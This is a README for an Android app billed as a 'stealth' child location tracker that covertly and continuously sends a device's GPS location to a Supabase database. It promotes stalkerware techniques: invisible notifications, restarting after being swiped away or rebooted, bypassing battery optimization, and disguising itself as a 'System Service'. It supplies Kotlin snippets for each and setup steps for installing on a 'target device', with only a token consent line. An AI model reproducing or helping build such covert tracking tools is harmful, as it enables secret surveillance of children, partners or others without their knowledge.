# 📍 Child Location Tracker - The Ultimate Stealth App

> _When you need to know where they are, but they don't need to know you're watching_ 👀

## 🔥 What's This All About?

Yo, so basically this is THE most hardcore location tracking app you'll ever see. No cap. This thing is designed to be absolutely invisible and unstoppable. Once it's running, good luck trying to stop it (unless you literally uninstall it or force-stop it in settings).

Built this for parents who are tired of their kids "forgetting" to check in or mysteriously having their location sharing turned off. This app doesn't ask for permission - it just works. Silently. Continuously. Forever.

## 🚀 Features That Hit Different

### 🥷 **Stealth Mode (The Real MVP)**

- **Invisible notifications** - Uses Android's lowest priority so it basically doesn't exist in your notification bar
- **Survives app kills** - Swipe it away from recents? Cute. It'll restart itself
- **Background immortality** - Keeps running even when the phone "sleeps"
- **Auto-restart on boot** - Phone restarts? App's already back up before you unlock it
- **Battery optimization bypass** - Asks to be excluded from battery saving (politely, but firmly)

### 📱 **Smart Android Tricks**

- **Foreground service abuse** - Runs as a "system service" so Android thinks it's important
- **Wake lock magic** - Prevents CPU from sleeping when getting location
- **AlarmManager backup** - If the service dies, an alarm brings it back to life
- **Multiple receivers** - Boot, package updates, quick boot - it catches everything
- **STICKY service** - Android literally can't kill it permanently

### 🌐 **Real-Time Everything**

- **Live location updates** - See location changes as they happen (30-60 second intervals)
- **WebSocket connections** - Direct pipeline to your database
- **Auto-reconnection** - Connection drops? Reconnects automatically
- **Privacy-focused** - Only keeps the latest location (auto-deletes old ones)

### 🛡️ **Privacy & Security**

- **Latest location only** - Database automatically yeeets old locations
- **Encrypted HTTPS** - All data transmission is secure
- **Row-level security** - Database locked down tight
- **Anonymous access** - No user accounts needed

## 🏗️ **The Tech Stack (For The Nerds)**

### **Frontend (Android)**

- **Kotlin** - Because Java is for boomers
- **Jetpack Compose** - Modern UI that looks clean AF
- **Coroutines** - Async operations that don't block the UI
- **Google Play Services** - For that sweet, sweet location accuracy

### **Backend (Supabase)**

- **PostgreSQL** - Database that can handle anything you throw at it
- **Real-time subscriptions** - WebSocket magic for instant updates
- **Row Level Security** - Fort Knox level database protection
- **Auto-cleanup triggers** - Database that cleans itself

### **Network Layer**

- **Retrofit** - HTTP client that just works
- **OkHttp** - Network interceptors and retry logic
- **Custom DNS resolver** - Bypasses private DNS issues
- **WebSocket client** - Real-time connection that never gives up

## 🎯 **How It Tricks Google (The Juicy Stuff)**

### **Service Persistence Hacks**

```kotlin
// This is how we make Android think we're essential
override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
    return START_STICKY  // Android: "Oh, this must be important"
}

// When user swipes app away
override fun onTaskRemoved(rootIntent: Intent?) {
    // Sneaky restart via AlarmManager
    scheduleServiceRestart()
    super.onTaskRemoved(rootIntent)
}
```

### **Wake Lock Wizardry**

- Grabs a partial wake lock to keep CPU alive during location updates
- Releases it immediately after to avoid battery drain
- Android thinks it's just a quick system operation

### **Notification Stealth**

```kotlin
NotificationCompat.Builder(context, CHANNEL_ID)
    .setImportance(NotificationManager.IMPORTANCE_MIN)  // Basically invisible
    .setPriority(NotificationCompat.PRIORITY_MIN)       // Android ignores it
    .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hidden from lock screen
    .setShowWhen(false)                                 // No timestamp
    .setSound(null)                                     // Silent AF
```

### **Boot Receiver Overkill**

Listens for:

- `ACTION_BOOT_COMPLETED` - Standard boot
- `ACTION_QUICKBOOT_POWERON` - Samsung/HTC fast boot
- `ACTION_MY_PACKAGE_REPLACED` - App updates
- Custom manufacturer boot actions

### **Battery Optimization Bypass**

```kotlin
// Politely asks to be excluded from battery optimization
val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
intent.data = Uri.parse("package:$packageName")
```

## 🔧 **Setup Guide (Actually Easy)**

### **Step 1: Database Setup**

1. Create a Supabase account (it's free)
2. Create a new project
3. Go to SQL Editor
4. Copy-paste the entire `COMPLETE_SETUP.sql` file
5. Hit run
6. Watch the magic happen ✨

### **Step 2: App Configuration**

1. Open `SupabaseConfig.kt`
2. Replace the URL with your Supabase project URL
3. Replace the anon key with your project's anon key
4. Change `CHILD_ID` if you want (or keep it as "child_001")

### **Step 3: Android Build**

1. Open project in Android Studio
2. Hit the build button
3. Install on target device
4. Grant all permissions (location, background location, battery optimization)
5. Start tracking
6. Profit 📈

## 🎮 **How To Use**

### **First Launch**

1. App asks for location permission - grant it
2. Asks for background location - grant it (this is crucial)
3. Asks to disable battery optimization - do it
4. Hit "Start Stealth Tracking"
5. App disappears into the background

### **Testing Connection**

- Use the "Test" button to check database connectivity
- Use "Diagnose" for detailed network troubleshooting
- If you see green checkmarks, you're golden

### **Monitoring**

- Open Supabase dashboard
- Go to Table Editor → locations
- Watch new location records appear every 30-60 seconds
- Only the latest location is kept (privacy first)

## 🚨 **How To Actually Stop It**

This app is designed to be nearly impossible to stop. Here are the ONLY ways:

1. **Use the stop button in the app** (if you can find it lol)
2. **Force stop in Android settings** (Settings → Apps → [App Name] → Force Stop)
3. **Uninstall the app** (nuclear option)
4. **Turn off location globally** (but this breaks other apps too)

Swiping it away from recent apps? Nah. Restarting the phone? Nope. "Optimizing" battery? Not happening.

## 🛠️ **Customization Options**

### **Location Update Frequency**

Change in `LocationTrackingService.kt`:

```kotlin
private val LOCATION_INTERVAL = 30000L  // 30 seconds (for the impatient)
private val FASTEST_INTERVAL = 15000L   // 15 seconds (for the paranoid)
```

### **Database Cleanup Behavior**

Current: Keeps only the latest location
Want to keep more? Modify the trigger in `COMPLETE_SETUP.sql`

### **Stealth Level**

Want it even more invisible?

- Remove the notification entirely (may cause Android to kill it more often)
- Change notification text to something generic like "System Service"

## 🐛 **Troubleshooting Common Issues**

### **"Connection Error" or DNS Issues**

- Probably private DNS blocking Supabase
- Go to Settings → Network → Private DNS → Off
- Or switch to mobile data to test

### **Location Not Updating**

- Check if background location permission is granted
- Make sure battery optimization is disabled
- Verify GPS is enabled

### **App Keeps Getting Killed**

- Some manufacturers are extra aggressive (looking at you, Xiaomi)
- Add app to "protected apps" list
- Disable any "auto-start management" restrictions

### **Real-Time Not Working**

- Check your Supabase real-time quota
- Verify WebSocket connections aren't blocked by firewall
- Test with mobile data vs WiFi

## 🔐 **Privacy & Legal Stuff**

### **Data Storage**

- Only the latest location is stored
- Old locations are automatically deleted
- No personal info beyond location coordinates
- HTTPS encryption for all data transmission

### **Legal Notice**

This app is designed for **legitimate family safety use**. Make sure you have proper consent before tracking anyone. Don't be creepy. Don't break laws. Use responsibly.

### **Battery Impact**

Despite being persistent, this app is designed to be battery-efficient:

- Only requests location every 30-60 seconds
- Uses efficient location APIs
- Releases wake locks immediately after use
- Optimized network requests

## 🎯 **Why This App Hits Different**

Most tracking apps are either:

1. **Too obvious** - big notifications, obvious in app drawer
2. **Too fragile** - easy to disable or stop
3. **Too limited** - only work when app is open

This app is:

- **Invisible** - runs silently in background
- **Persistent** - nearly impossible to stop accidentally
- **Reliable** - continues working through restarts, updates, etc.
- **Real-time** - updates are instant
- **Privacy-focused** - doesn't hoard your data

## 🚀 **Future Plans**

- [ ] Multiple device support
- [ ] Geofencing alerts
- [ ] Better stealth options
- [ ] iOS version (maybe, if Apple allows it)
- [ ] Web dashboard improvements
- [ ] Custom notification disguises

## 💭 **Final Thoughts**

This isn't just another location tracking app. This is a masterclass in Android system manipulation and persistence. It uses every trick in the book to stay alive and invisible.

Built with love, coffee, and a healthy disrespect for Android's attempts to kill background services.

Remember: With great power comes great responsibility. Use this wisely.

---

_P.S. - If you're a kid who found this README while trying to figure out why your location is being tracked... well, now you know. Your parents are just worried about you. Maybe check in more often? 😉_

**Built by someone who got tired of "my phone died" excuses** 📱💀
